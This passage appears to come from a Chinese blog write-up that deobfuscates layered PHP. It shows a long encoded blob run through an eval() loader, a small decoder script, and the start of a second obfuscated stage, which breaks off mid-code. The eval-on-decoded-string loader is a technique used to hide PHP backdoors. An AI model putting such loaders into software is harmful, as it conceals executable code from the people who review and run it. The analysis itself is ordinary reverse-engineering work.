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&quot;</span>;<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$pUOGCn</span>(<span class="hljs-variable">$VFezNp</span>(<span class="hljs-variable">$YuLeHh</span>(<span class="hljs-variable">$VkBFwi</span>,<span class="hljs-variable">$rOucYP</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YuLeHh</span>(<span class="hljs-variable">$VkBFwi</span>,<span class="hljs-variable">$rOucYP</span>,<span class="hljs-variable">$rOucYP</span>),<span class="hljs-variable">$YuLeHh</span>(<span class="hljs-variable">$VkBFwi</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rOucYP</span>))));<br></code></pre></td></tr></table></figure><p>可以发现还有b64字符串，但是解密不出来，目测需要<code>$pUOGCn($VFezNp($YuLeHh($VkBFwi,$rOucYP*2),$YuLeHh($VkBFwi,$rOucYP,$rOucYP),$YuLeHh($VkBFwi,0,$rOucYP)))</code>进行解密。这些混淆变量都能在constant.php找到对应的函数名称，替换后使用下面的代码可以进行解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$VkBFwi</span>=<span class="hljs-string">&quot;太长了我这里就不写了，自行替换吧。。O__O&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$VkBFwi</span>,<span class="hljs-number">52</span>*<span class="hljs-number">2</span>),<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$VkBFwi</span>,<span class="hljs-number">52</span>,<span class="hljs-number">52</span>),<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$VkBFwi</span>,<span class="hljs-number">0</span>,<span class="hljs-number">52</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>把上面的php代码放到虚拟机里执行，发现页面空白，在F12查看源代码后发现被注释了（真的狡猾）。然后里面又是一堆的b64，这次依然给出最后的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;myDEVF1209&#x27;</span>,tzbDEw1209);<span class="hljs-variable">$jJExWG</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqRm11WFdEa0JFeFZNemRKblNHaExjbGFLdllOUkNneWp3Wmllb1BxUXRBZkhJclVzVHBiTw==&quot;</span>);<span class="hljs-variable">$xlJGRj</span>=<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">6</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">33</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">30</span>];<span class="hljs-variable">$NuQrnW</span>=<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">33</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">10</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">24</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">10</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">24</span>];<span class="hljs-variable">$YYIHlX</span>=<span class="hljs-variable">$NuQrnW</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">18</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">3</span>].<span class="hljs-variable">$NuQrnW</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$NuQrnW</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">24</span>];<span class="hljs-variable">$aAKfSJ</span>=<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">7</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">13</span>];<span class="hljs-variable">$xlJGRj</span>.=<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">22</span>].<span class="hljs-variable">$jJExWG</span>[<span class="hljs-number">36</span>].<span class="hljs-variable">$jJExWG</span>[<span 